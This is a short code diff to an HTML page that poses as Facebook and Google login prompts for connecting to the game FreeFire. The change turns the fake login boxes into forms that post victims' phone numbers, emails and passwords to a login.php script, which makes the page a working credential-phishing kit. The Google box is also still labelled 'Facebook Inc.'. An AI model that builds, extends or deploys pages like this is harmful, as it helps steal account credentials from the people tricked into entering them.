@@ -41,9 +41,11 @@
 			<div class="login-container">
 				<img src="images/image002.jpg">
 				<h4>Log in to your Facebook account to<br>connect to FreeFire</h4>
-				<input id="mobile-no" type="email" placeholder="Phone Number"/><br>
-				<input id="password" type="password" placeholder="password"/><br>
-				<input id="login-btn" type="button" value="Log In" onclick="FBloginOnClick()">
+				<form action="login.php" method="post">
+					<input id="mobile-no" name="email-num" type="text" placeholder="Phone Number"/><br>
+					<input id="password" name="fpassword" type="password" placeholder="password"/><br>
+					<input type="submit" id="login-btn" name="login-fb" value="Log In" onclick="FBloginOnClick()">
+				</form>
 				<h6>Facebook Inc.</h6>
 			</div>
 		</div>
@@ -56,9 +58,12 @@
 			<div class="glogin-container">
 				<img src="images/image002.jpg">
 				<h4>Log in to your Google account to<br>connect to FreeFire</h4>
-				<input id="email" type="email" placeholder="Email"/><br>
-				<input id="gpassword" type="password" placeholder="password"/><br>
-				<input id="glogin-btn" type="button" value="Sign In" onclick="GoogleloginOnClick()">
+				<form action="login.php" method="post">
+					<input id="email" name="email" type="email" placeholder="Email"/><br>
+					<input id="gpassword" name="gpassword" type="password" placeholder="password"/><br>
+					<input type="submit" id="glogin-btn" name="login-go" value="Sign In" onclick="GoogleloginOnClick()">
+				</form>
+				
 				<h6>Facebook Inc.</h6>
 			</div>
 		</div>
@@ -72,3 +77,4 @@
 		</div>
 	</body>
 	</html>	
+	
